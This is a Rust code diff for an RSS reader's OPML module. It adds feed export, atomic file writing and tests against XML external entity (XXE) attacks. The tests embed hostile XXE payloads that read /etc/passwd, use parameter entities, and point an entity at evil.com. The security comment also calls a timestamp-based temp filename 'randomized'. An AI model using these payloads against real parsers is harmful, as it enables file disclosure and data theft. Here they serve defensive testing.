@@ -65,8 +65,9 @@ pub struct OpmlFeed {
 ///
 /// # Security
 ///
-/// - XXE (XML External Entity) attacks are mitigated by `quick-xml`'s default
-///   configuration which disables entity expansion
+/// - XXE (XML External Entity) attacks are mitigated because `quick-xml` (0.37) does not
+///   parse `<!ENTITY>` declarations. Custom entities cause `EscapeError::UnrecognizedEntity`.
+///   See SEC-002 comment in `parse_opml_content()` for details.
 /// - URLs are validated to prevent SSRF attacks against localhost and private networks
 pub async fn parse(path: &str) -> Result<Vec<OpmlFeed>> {
     let content = tokio::fs::read_to_string(path)
@@ -84,8 +85,13 @@ pub async fn parse(path: &str) -> Result<Vec<OpmlFeed>> {
 /// Category/folder outlines (those without `xmlUrl`) are traversed but
 /// not returned in the result.
 fn parse_opml_content(content: &str) -> Result<Vec<OpmlFeed>> {
-    // SEC-002: quick-xml has XXE protection enabled by default (entity expansion disabled).
-    // Custom entity definitions in DOCTYPE are not expanded, preventing XXE attacks.
+    // SEC-002: XXE protection — quick-xml (0.37) never parses <!ENTITY> declarations from
+    // DOCTYPE. Entity resolution is handled solely by `resolve_predefined_entity()` in the
+    // escape layer, which only resolves the 5 XML builtins (&lt; &gt; &amp; &apos; &quot;).
+    // Custom entities like &xxe; produce an `EscapeError::UnrecognizedEntity` error via
+    // `decode_and_unescape_value()`. There is no Config toggle for this — it is structural.
+    // If a future quick-xml version adds entity expansion, our use of
+    // `decode_and_unescape_value()` (not `_with()`) ensures we stay on the safe default.
     let mut reader = Reader::from_str(content);
     reader.config_mut().trim_text(true);
 
@@ -185,6 +191,153 @@ fn parse_outline_attributes(
     } else {
         Ok(None)
     }
+}
+
+/// Exports feed subscriptions as an OPML 2.0 XML string.
+///
+/// Generates a valid OPML 2.0 document containing `<outline>` elements
+/// for each feed, with `type="rss"`, `text`, `title`, `xmlUrl`, and
+/// optionally `htmlUrl` attributes.
+///
+/// # Arguments
+///
+/// * `feeds` - Slice of [`OpmlFeed`] structs to export
+///
+/// # Returns
+///
+/// A `String` containing the complete OPML 2.0 XML document.
+pub fn export_opml(feeds: &[OpmlFeed]) -> Result<String> {
+    use quick_xml::events::{BytesDecl, BytesEnd, BytesStart, Event};
+    use quick_xml::Writer;
+    use std::io::Cursor;
+
+    let mut writer = Writer::new_with_indent(Cursor::new(Vec::new()), b' ', 2);
+
+    // XML declaration
+    writer
+        .write_event(Event::Decl(BytesDecl::new("1.0", Some("UTF-8"), None)))
+        .context("Failed to write XML declaration")?;
+
+    // <opml version="2.0">
+    let mut opml = BytesStart::new("opml");
+    opml.push_attribute(("version", "2.0"));
+    writer
+        .write_event(Event::Start(opml))
+        .context("Failed to write opml element")?;
+
+    // <head><title>skim RSS Subscriptions</title></head>
+    writer
+        .write_event(Event::Start(BytesStart::new("head")))
+        .context("Failed to write head element")?;
+    writer
+        .write_event(Event::Start(BytesStart::new("title")))
+        .context("Failed to write title element")?;
+    writer
+        .write_event(Event::Text(quick_xml::events::BytesText::new(
+            "skim RSS Subscriptions",
+        )))
+        .context("Failed to write title text")?;
+    writer
+        .write_event(Event::End(BytesEnd::new("title")))
+        .context("Failed to write title end")?;
+    writer
+        .write_event(Event::End(BytesEnd::new("head")))
+        .context("Failed to write head end")?;
+
+    // <body>
+    writer
+        .write_event(Event::Start(BytesStart::new("body")))
+        .context("Failed to write body element")?;
+
+    for feed in feeds {
+        let mut outline = BytesStart::new("outline");
+        outline.push_attribute(("type", "rss"));
+        outline.push_attribute(("text", feed.title.as_str()));
+        outline.push_attribute(("title", feed.title.as_str()));
+        outline.push_attribute(("xmlUrl", feed.xml_url.as_str()));
+        if let Some(ref html_url) = feed.html_url {
+            outline.push_attribute(("htmlUrl", html_url.as_str()));
+        }
+        writer
+            .write_event(Event::Empty(outline))
+            .context("Failed to write outline element")?;
+    }
+
+    // </body>
+    writer
+        .write_event(Event::End(BytesEnd::new("body")))
+        .context("Failed to write body end")?;
+
+    // </opml>
+    writer
+        .write_event(Event::End(BytesEnd::new("opml")))
+        .context("Failed to write opml end")?;
+
+    let result = writer.into_inner().into_inner();
+    String::from_utf8(result).context("Generated OPML contains invalid UTF-8")
+}
+
+/// Exports feed subscriptions to an OPML file atomically.
+///
+/// Writes the OPML content to a temporary file in the same directory,
+/// syncs to disk, then atomically renames to the final path. This ensures
+/// the destination file is never left in a partial state.
+///
+/// # Arguments
+///
+/// * `feeds` - Slice of [`OpmlFeed`] structs to export
+/// * `path` - Destination filesystem path for the OPML file
+pub fn export_to_file(feeds: &[OpmlFeed], path: &std::path::Path) -> Result<()> {
+    use std::time::{SystemTime, UNIX_EPOCH};
+
+    let content = export_opml(feeds)?;
+
+    // SEC-009: Randomized temp filename to prevent TOCTOU race conditions
+    let random_suffix = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .map(|d| d.as_nanos())
+        .unwrap_or(0);
+    let temp_path = path.with_extension(format!("tmp.{:016x}", random_suffix));
+
+    let mut file = std::fs::OpenOptions::new()
+        .write(true)
+        .create_new(true)
+        .open(&temp_path)
+        .with_context(|| {
+            format!(
+                "Failed to create temporary file '{}': check directory permissions",
+                temp_path.display()
+            )
+        })?;
+
+    std::io::Write::write_all(&mut file, content.as_bytes()).with_context(|| {
+        let _ = std::fs::remove_file(&temp_path);
+        format!(
+            "Failed to write OPML to temporary file '{}'",
+            temp_path.display()
+        )
+    })?;
+
+    file.sync_all().with_context(|| {
+        let _ = std::fs::remove_file(&temp_path);
+        format!(
+            "Failed to sync temporary file '{}' to disk",
+            temp_path.display()
+        )
+    })?;
+
+    drop(file);
+
+    std::fs::rename(&temp_path, path).with_context(|| {
+        let _ = std::fs::remove_file(&temp_path);
+        format!(
+            "Failed to rename '{}' to '{}'",
+            temp_path.display(),
+            path.display()
+        )
+    })?;
+
+    Ok(())
 }
 
 #[cfg(test)]
@@ -308,7 +461,9 @@ mod tests {
     #[test]
     fn test_xxe_protection() {
         // SEC-002: This XXE payload should NOT expand to file contents.
-        // quick-xml does not expand custom entity definitions by default.
+        // quick-xml (0.37) does not parse <!ENTITY> declarations at all.
+        // The &xxe; reference will hit `resolve_predefined_entity()` which only
+        // knows the 5 XML builtins, causing an EscapeError::UnrecognizedEntity.
         let malicious_opml = r#"<?xml version="1.0"?>
 <!DOCTYPE opml [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <opml version="2.0">
@@ -335,6 +490,97 @@ mod tests {
             }
             Err(_) => {
                 // Rejection of XXE payload is also acceptable behavior
+            }
+        }
+    }
+
+    #[test]
+    fn test_xxe_internal_entity_not_expanded() {
+        // SEC-002: Internal (non-SYSTEM) entity declarations should also not expand.
+        // This tests the case where the entity is defined inline in the DOCTYPE,
+        // not referencing an external file.
+        let opml_with_internal_entity = r#"<?xml version="1.0"?>
+<!DOCTYPE opml [<!ENTITY internal "EXPANDED_VALUE">]>
+<opml version="2.0">
+    <body>
+        <outline text="&internal;" xmlUrl="https://example.com/feed.xml"/>
+    </body>
+</opml>"#;
+
+        let result = parse_opml_content(opml_with_internal_entity);
+        match result {
+            Ok(feeds) => {
+                for feed in &feeds {
+                    assert!(
+                        !feed.title.contains("EXPANDED_VALUE"),
+                        "Internal entity was expanded! Title: {}",
+                        feed.title
+                    );
+                }
+            }
+            Err(_) => {
+                // Rejection (UnrecognizedEntity error) is the expected behavior
+            }
+        }
+    }
+
+    #[test]
+    fn test_xxe_parameter_entity_not_expanded() {
+        // SEC-002: Parameter entities (%entity;) used in DTD attacks should not expand.
+        let opml_with_param_entity = r#"<?xml version="1.0"?>
+<!DOCTYPE opml [
+  <!ENTITY % payload SYSTEM "file:///etc/passwd">
+  <!ENTITY % wrapper "<!ENTITY exploit '%payload;'>">
+  %wrapper;
+]>
+<opml version="2.0">
+    <body>
+        <outline text="test" xmlUrl="https://example.com/feed.xml"/>
+    </body>
+</opml>"#;
+
+        let result = parse_opml_content(opml_with_param_entity);
+        match result {
+            Ok(feeds) => {
+                // If parsing succeeds, no entity content should leak into feed data
+                for feed in &feeds {
+                    assert!(
+                        !feed.title.contains("root:"),
+                        "Parameter entity XXE detected! Title: {}",
+                        feed.title
+                    );
+                }
+            }
+            Err(_) => {
+                // Rejection is acceptable — quick-xml may error on malformed DOCTYPE
+            }
+        }
+    }
+
+    #[test]
+    fn test_xxe_entity_in_url_attribute() {
+        // SEC-002: Entity references in xmlUrl attributes should also be rejected.
+        let opml_entity_in_url = r#"<?xml version="1.0"?>
+<!DOCTYPE opml [<!ENTITY exfil SYSTEM "https://evil.com/steal">]>
+<opml version="2.0">
+    <body>
+        <outline text="Legit Feed" xmlUrl="&exfil;"/>
+    </body>
+</opml>"#;
+
+        let result = parse_opml_content(opml_entity_in_url);
+        match result {
+            Ok(feeds) => {
+                for feed in &feeds {
+                    assert!(
+                        !feed.xml_url.contains("evil.com"),
+                        "Entity expanded in URL! URL: {}",
+                        feed.xml_url
+                    );
+                }
+            }
+            Err(_) => {
+                // Rejection is the expected behavior
             }
         }
     }
@@ -386,5 +632,83 @@ mod tests {
         let feeds = result.unwrap();
         assert_eq!(feeds.len(), 1);
         assert_eq!(feeds[0].title, "Deep Feed");
+    }
+
+    #[test]
+    fn test_export_opml_round_trip() {
+        let original = vec![
+            OpmlFeed {
+                title: "Example Blog".to_string(),
+                xml_url: "https://example.com/feed.xml".to_string(),
+                html_url: Some("https://example.com".to_string()),
+            },
+            OpmlFeed {
+                title: "No HTML Feed".to_string(),
+                xml_url: "https://nohtml.com/rss".to_string(),
+                html_url: None,
+            },
+        ];
+
+        let exported = export_opml(&original).expect("Failed to export OPML");
+        let parsed = parse_opml_content(&exported).expect("Failed to parse exported OPML");
+
+        assert_eq!(parsed.len(), original.len());
+        for (orig, round) in original.iter().zip(parsed.iter()) {
+            assert_eq!(orig.title, round.title);
+            assert_eq!(orig.xml_url, round.xml_url);
+            assert_eq!(orig.html_url, round.html_url);
+        }
+    }
+
+    #[test]
+    fn test_export_opml_empty_feeds() {
+        let exported = export_opml(&[]).expect("Failed to export empty OPML");
+        assert!(exported.contains("<?xml"));
+        assert!(exported.contains("<opml"));
+        assert!(exported.contains("<body"));
+        assert!(exported.contains("</body>"));
+
+        let parsed = parse_opml_content(&exported).expect("Failed to parse empty OPML");
+        assert!(parsed.is_empty());
+    }
+
+    #[test]
+    fn test_export_opml_xml_escaping() {
+        let feeds = vec![OpmlFeed {
+            title: "Feed with <special> & \"chars\"".to_string(),
+            xml_url: "https://example.com/feed?a=1&b=2".to_string(),
+            html_url: None,
+        }];
+
+        let exported = export_opml(&feeds).expect("Failed to export OPML with special chars");
+        let parsed =
+            parse_opml_content(&exported).expect("Failed to parse OPML with special chars");
+
+        assert_eq!(parsed.len(), 1);
+        assert_eq!(parsed[0].title, "Feed with <special> & \"chars\"");
+        assert_eq!(parsed[0].xml_url, "https://example.com/feed?a=1&b=2");
+    }
+
+    #[test]
+    fn test_export_to_file() {
+        let feeds = vec![OpmlFeed {
+            title: "File Export Test".to_string(),
+            xml_url: "https://example.com/feed.xml".to_string(),
+            html_url: Some("https://example.com".to_string()),
+        }];
+
+        let dir = std::env::temp_dir();
+        let path = dir.join("test_export.opml");
+
+        export_to_file(&feeds, &path).expect("Failed to export to file");
+
+        let content = std::fs::read_to_string(&path).expect("Failed to read exported file");
+        let parsed = parse_opml_content(&content).expect("Failed to parse file content");
+
+        assert_eq!(parsed.len(), 1);
+        assert_eq!(parsed[0].title, "File Export Test");
+
+        // Cleanup
+        let _ = std::fs::remove_file(&path);
     }
 }
